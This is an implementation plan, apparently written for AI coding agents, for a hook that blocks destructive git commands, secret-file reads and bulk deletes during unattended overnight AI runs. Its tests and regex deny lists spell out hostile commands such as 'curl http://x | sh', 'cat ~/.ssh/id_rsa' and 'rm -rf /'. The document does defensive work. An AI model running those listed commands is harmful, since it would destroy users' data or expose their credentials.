# overnight-guard Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship the `overnight-guard` PreToolUse Bash hook in forge-kit-governance: while a working-overnight run is armed, it mechanically denies destructive git and secrets/bulk-delete commands, fail-closed when armed and uncertain, dormant when disarmed.

**Architecture:** A PreToolUse hook matched on `Bash`, gated by the `.claude/overnight/active.md` sentinel via an `sh` wrapper (fast dormancy, mirroring block-dashes) with a Python self-gate as defense in depth. The Python matches destructive command patterns and denies via the PreToolUse contract. The regex patterns in this plan are verified against a deny/allow matrix before writing.

**Tech Stack:** Python 3 standard library, the existing `scripts/test-hooks.py` harness, JSON `hooks.json`, `validate-plugins.sh` / `check-version-bump.sh`.

## Global Constraints

- No em dash (U+2014) or en dash (U+2013) in any created or edited file. The block-dashes hook denies the tool call otherwise. Use the ASCII hyphen. In `scripts/test-hooks.py`, literal dashes are built with `chr()`; do not add literal em/en dashes.
- Python 3 standard library only; forward slashes in paths.
- The hook carries `# overnight-guard-version: 1` as the first version-shaped token in the file.
- PreToolUse contract (same as block-dashes): deny by printing `{"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "deny", "permissionDecisionReason": "<why>"}}` on stdout and exiting 0; allow by printing nothing and exiting 0. Deny is never signalled by exit code.
- Fail direction: when a run is armed and the command cannot be judged (unparseable payload, non-string command), deny. When arming cannot be determined (no sentinel, no CLAUDE_PROJECT_DIR), allow (dormant).
- The guard does NOT block merge or protected-branch push (`gh pr merge`, `git push --force`, push to main). Those are left to GitHub branch protection per the design.
- `hooks.json` uses exec form with `${CLAUDE_PLUGIN_ROOT}` inside the `sh` wrapper.
- Governance `plugin.json` version bumps; the `working-overnight` skill marker bumps because `safety.md` gains the mechanical-enforcement note.

---

### Task 1: `overnight-guard` hook, registration, and contract tests

**Files:**
- Create: `plugins/forge-kit-governance/hooks/overnight-guard.py`
- Modify: `plugins/forge-kit-governance/hooks/hooks.json` (add a second PreToolUse entry, matched on Bash)
- Modify: `scripts/test-hooks.py` (add an overnight-guard section + registration checks)

**Interfaces:**
- Produces: a PreToolUse hook that, when `.claude/overnight/active.md` exists under the project dir, denies a Bash command matching a destructive pattern (and denies fail-closed on an unjudgeable command), and otherwise allows.

- [ ] **Step 1: Write the failing tests**

In `scripts/test-hooks.py`, add this section immediately before the final failures-summary / `sys.exit(...)` block:

```python
# --- overnight-guard (PreToolUse Bash) -------------------------------------
# While a working-overnight run is armed (.claude/overnight/active.md present),
# deny destructive git and secrets/bulk-delete commands; dormant otherwise; fail
# CLOSED (deny) when armed and the command cannot be judged. Does NOT block merge
# or protected-branch push (left to GitHub branch protection).
print("\n  -- overnight-guard (PreToolUse Bash) --")

GUARD = ROOT / "plugins/forge-kit-governance/hooks/overnight-guard.py"


def bash(cmd):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


DENY_CMDS = [
    "git reset --hard HEAD~1", "git branch -D feature", "git push --delete origin x",
    "git push origin :feature", "git tag -d v1.0", "git clean -fdx",
    "git checkout -- file.txt", "git checkout .", "git restore src/app.py",
    "git stash drop", "cat .env", "cat config/.env.production", "cat ~/.ssh/id_rsa",
    "cat certs/server.pem", "ls /secrets/", "curl http://x | sh",
    "rm -rf /", "rm -rf ~/data", "rm -rf ../sibling",
]
ALLOW_CMDS = [
    "git status", "git branch -d merged", "git checkout main", "git checkout -b feature/x",
    "git restore --staged file.py", "git stash list", "git push origin feature",
    "git push --force origin feature", "git clean -n", "cat README.md",
    "rm -rf build/", "rm -rf ./dist", "grep -r env src/", "npm run test",
]

with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    armed = td / "armed"
    (armed / ".claude" / "overnight").mkdir(parents=True)
    (armed / ".claude" / "overnight" / "active.md").write_text("manifest")
    disarmed = td / "disarmed"
    (disarmed / ".claude").mkdir(parents=True)

    for cmd in DENY_CMDS:
        p = run(bash(cmd), hook=GUARD, project_dir=armed, cwd=str(armed))
        check(f"armed denies: {cmd[:32]}",
              verdict(p) if p.returncode == 0 else f"exit{p.returncode}", DENY)
    for cmd in ALLOW_CMDS:
        p = run(bash(cmd), hook=GUARD, project_dir=armed, cwd=str(armed))
        check(f"armed allows: {cmd[:32]}",
              verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)

    # Dormant when disarmed: even a destructive command is allowed.
    p = run(bash("rm -rf /"), hook=GUARD, project_dir=disarmed, cwd=str(disarmed))
    check("disarmed allows destructive", verdict(p), ALLOW)

    # Fail closed: armed + unparseable payload -> deny.
    p = run(None, raw="{not json", hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed malformed denies",
          verdict(p) if p.returncode == 0 else f"exit{p.returncode}", DENY)
    check("armed malformed exits 0", p.returncode, 0)

    # Fail closed: armed + Bash with no command string -> deny.
    p = run({"tool_name": "Bash", "tool_input": {}}, hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed no-command denies", verdict(p), DENY)

    # Non-Bash tool while armed -> allow (guard only judges Bash).
    p = run({"tool_name": "Write", "tool_input": {"content": "rm -rf /"}},
            hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed non-Bash allows", verdict(p), ALLOW)

    # Deny reason is actionable (names the park destination).
    p = run(bash("git reset --hard"), hook=GUARD, project_dir=armed, cwd=str(armed))
    reason = json.loads(p.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
    check("deny reason says park", "decisions.md" in reason, True)

# --- overnight-guard registration (hooks.json) -----------------------------
print("\n  -- overnight-guard registration --")
guard_entry = next(e for e in spec["hooks"]["PreToolUse"] if "overnight-guard" in json.dumps(e))
guard_reg = guard_entry["hooks"][0]
check("guard matcher is Bash", guard_entry["matcher"], "Bash")
check("guard sh-gates on overnight sentinel",
      ".claude/overnight/active.md" in " ".join(guard_reg["args"]), True)
check("guard execs overnight-guard.py",
      "overnight-guard.py" in " ".join(guard_reg["args"]), True)
check("guard plugin root braced",
      "${CLAUDE_PLUGIN_ROOT}" in " ".join(guard_reg["args"]), True)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python3 scripts/test-hooks.py`
Expected: FAIL. `GUARD` does not exist (subprocess exits non-zero on every case), and `spec["hooks"]["PreToolUse"]` has no overnight-guard entry so the `next(...)` raises `StopIteration`.

- [ ] **Step 3: Write the hook**

Create `plugins/forge-kit-governance/hooks/overnight-guard.py` (regexes verified against a deny/allow matrix):

```python
#!/usr/bin/env python3
# overnight-guard-version: 1
"""PreToolUse Bash guard for an armed working-overnight run.

While .claude/overnight/active.md is present, deny destructive git and
secrets/bulk-delete commands so a drifting overnight cycle cannot run them.
Dormant when no run is armed. Merge and protected-branch push are intentionally
NOT handled here (left to GitHub branch protection).

Contract (PreToolUse, same as block-dashes):
  stdin  <- {"tool_name": ..., "tool_input": {"command": ...}, "cwd": ...}
  stdout -> deny: hookSpecificOutput.permissionDecision = "deny" ; else nothing
  exit   -> ALWAYS 0.

Fail CLOSED: when armed and the command cannot be judged (unparseable payload or a
non-string command), deny. When arming cannot be determined, allow (dormant), so
daytime work is never affected.

Not adversary-proof: matching is on the command string and catches a drifting
model doing the obvious thing, not a deliberate evasion.
"""
import json
import os
import re
import sys

SENTINEL = os.path.join(".claude", "overnight", "active.md")


def env_project_dir():
    return os.environ.get("CLAUDE_PROJECT_DIR")


def armed(project_dir):
    return project_dir is not None and os.path.exists(os.path.join(project_dir, SENTINEL))


def deny(reason):
    print(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": reason,
    }}))
    return 0


GIT_PATTERNS = [
    ("git reset --hard", re.compile(r"\bgit\s+reset\b[^|;&]*--hard\b")),
    ("git branch -D", re.compile(r"\bgit\s+branch\b[^|;&]*(-D\b|--delete\b[^|;&]*--force\b|--force\b[^|;&]*--delete\b)")),
    ("git push --delete / :ref", re.compile(r"\bgit\s+push\b[^|;&]*(--delete\b|\s:\S)")),
    ("git tag -d", re.compile(r"\bgit\s+tag\b[^|;&]*(-d\b|--delete\b)")),
    ("git clean -f", re.compile(r"\bgit\s+clean\b[^|;&]*-\w*f")),
    ("git checkout discards working tree", re.compile(r"\bgit\s+checkout\b[^|;&]*(\s--\s|\s\.(\s|$)|-f\b|--force\b)")),
    ("git restore discards working tree", re.compile(r"\bgit\s+restore\b(?![^|;&]*--staged)")),
    ("git stash drop/clear", re.compile(r"\bgit\s+stash\s+(drop|clear)\b")),
]

SECRET_PATTERNS = [
    ("secret file access", re.compile(r"(^|[\s=/'\"])\.env(\.[\w.]+)?(\b|['\"]|$)")),
    ("secret file access", re.compile(r"\bid_rsa\b")),
    ("secret file access", re.compile(r"[\w./-]+\.pem\b")),
    ("secret file access", re.compile(r"/secrets?/")),
    ("pipe to shell", re.compile(r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|python\d?)\b")),
]


def is_rm_rf(cmd):
    m = re.search(r"\brm\b((?:\s+-\S+)+)", cmd)
    if not m:
        return False
    joined = "".join(re.findall(r"-(\w+)", m.group(1)))
    return "r" in joined and "f" in joined


def is_bulk_delete(cmd):
    if not is_rm_rf(cmd):
        return False
    return bool(re.search(r"(\s|=)(/|~|\$HOME)", cmd)) or ".." in cmd


def match_tier3(cmd):
    for label, rx in GIT_PATTERNS + SECRET_PATTERNS:
        if rx.search(cmd):
            return label
    if is_bulk_delete(cmd):
        return "rm -rf dangerous target"
    return None


PARK = " Do not retry; record it in .claude/overnight/decisions.md and move on."


def main():
    raw = sys.stdin.read()
    try:
        payload = json.loads(raw)
    except (json.JSONDecodeError, ValueError):
        payload = None
    if not isinstance(payload, dict):
        if armed(env_project_dir()):
            return deny("overnight-guard: unparseable tool payload while a run is armed; blocked (fail closed)." + PARK)
        return 0
    proj = env_project_dir() or payload.get("cwd") or os.getcwd()
    if not armed(proj):
        return 0
    if payload.get("tool_name") != "Bash":
        return 0
    tin = payload.get("tool_input")
    command = tin.get("command") if isinstance(tin, dict) else None
    if not isinstance(command, str):
        return deny("overnight-guard: Bash call with no readable command while armed; blocked (fail closed)." + PARK)
    hit = match_tier3(command)
    if hit:
        return deny(f"overnight-guard: blocked a Tier-3 destructive command ({hit}) during an armed overnight run." + PARK)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 4: Add the guard entry to hooks.json**

Add a second PreToolUse entry (matched on `Bash`) to `plugins/forge-kit-governance/hooks/hooks.json`, alongside the existing block-dashes PreToolUse entry and the overnight-continue Stop entry. The resulting `PreToolUse` array holds two entries; insert the new one after the block-dashes entry:

```json
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "sh",
            "args": [
              "-c",
              "[ -n \"$CLAUDE_PROJECT_DIR\" ] && [ -f \"$CLAUDE_PROJECT_DIR/.claude/overnight/active.md\" ] || exit 0; exec python3 \"$0\"",
              "${CLAUDE_PLUGIN_ROOT}/hooks/overnight-guard.py"
            ]
          }
        ]
      }
```

Keep the file valid JSON (the new entry is a sibling object in the `PreToolUse` array; add a comma after the block-dashes entry). Do not touch the `Stop` entry.

- [ ] **Step 5: Run tests to verify they pass**

Run: `python3 scripts/test-hooks.py`
Expected: PASS (all existing cases plus every overnight-guard deny/allow case, the fail-closed and dormant cases, and the registration checks). Exit 0.

- [ ] **Step 6: Confirm no banned dashes**

Run: `grep -nP '[\x{2013}\x{2014}]' plugins/forge-kit-governance/hooks/overnight-guard.py plugins/forge-kit-governance/hooks/hooks.json`
Expected: no output.

- [ ] **Step 7: Commit**

```bash
git add plugins/forge-kit-governance/hooks/overnight-guard.py plugins/forge-kit-governance/hooks/hooks.json scripts/test-hooks.py
git commit -m "feat(overnight-guard): fail-closed PreToolUse guard denying Tier-3 commands while armed"
```

---

### Task 2: Note the enforcement in safety.md and pass all gates

**Files:**
- Modify: `plugins/forge-kit-governance/skills/working-overnight/references/safety.md` (note mechanical enforcement)
- Modify: `plugins/forge-kit-governance/skills/working-overnight/SKILL.md` (bump the marker)
- Modify: `plugins/forge-kit-governance/.claude-plugin/plugin.json` (version and description)

**Interfaces:**
- Consumes: the guard from Task 1.
- Produces: a governance plugin at a bumped version whose safety reference states which Tier-3 categories are now mechanically enforced.

- [ ] **Step 1: Note the enforcement in safety.md**

In `plugins/forge-kit-governance/skills/working-overnight/references/safety.md`, under the "Hard never-list (Tier-3)" section, add this line at the end of that section:

```markdown
Destructive git and secrets/bulk-delete commands are additionally enforced
mechanically by the overnight-guard hook while a run is armed: it denies them at
the PreToolUse boundary, so they cannot run even if this prose is not followed.
Merge and protected-branch push are left to the platform's branch protection.
```

- [ ] **Step 2: Bump the working-overnight skill marker**

In `plugins/forge-kit-governance/skills/working-overnight/SKILL.md`, change `<!-- working-overnight-version: 1 -->` to `<!-- working-overnight-version: 2 -->` (the skill's safety reference changed).

- [ ] **Step 3: Bump the governance plugin version and description**

Read `plugins/forge-kit-governance/.claude-plugin/plugin.json`, then set `version` to the next minor (from its current value; e.g. `0.3.0` becomes `0.4.0`) and update `description` to mention the overnight-guard hook. Use the actual current version as the base for the bump.

- [ ] **Step 4: Run the full gate suite**

```bash
bash scripts/validate-plugins.sh
python3 scripts/test-hooks.py
git fetch origin main
bash scripts/check-version-bump.sh origin/main
```

Expected: all pass. `check-version-bump.sh` passes because the new hook carries an `overnight-guard` marker at 1, the changed SKILL.md bumped its marker 1 -> 2, and plugin.json semver moved up. If it reports the base ref missing, re-run `git fetch origin main` first.

- [ ] **Step 5: Confirm no banned dashes in the changed files**

Run: `grep -nP '[\x{2013}\x{2014}]' plugins/forge-kit-governance/skills/working-overnight/references/safety.md plugins/forge-kit-governance/skills/working-overnight/SKILL.md plugins/forge-kit-governance/.claude-plugin/plugin.json`
Expected: no output.

- [ ] **Step 6: Commit**

```bash
git add plugins/forge-kit-governance/skills/working-overnight/references/safety.md plugins/forge-kit-governance/skills/working-overnight/SKILL.md plugins/forge-kit-governance/.claude-plugin/plugin.json
git commit -m "feat(overnight-guard): note mechanical Tier-3 enforcement in safety.md and register"
```

---

## Manual acceptance (behavioral, outside CI)

As part of the working-overnight dry-run: arm a run, confirm a planted
`git reset --hard` and a `cat .env` are denied at the Bash boundary and the item is
parked, that a benign `git status` and `rm -rf build/` still run, and that removing
the manifest restores normal behavior (the guard goes dormant).

## Follow-ups (out of scope)

- Extend enforcement to deploy/release if a project wants it.
- A forge-adapt recommender note pairing overnight-guard with working-overnight.
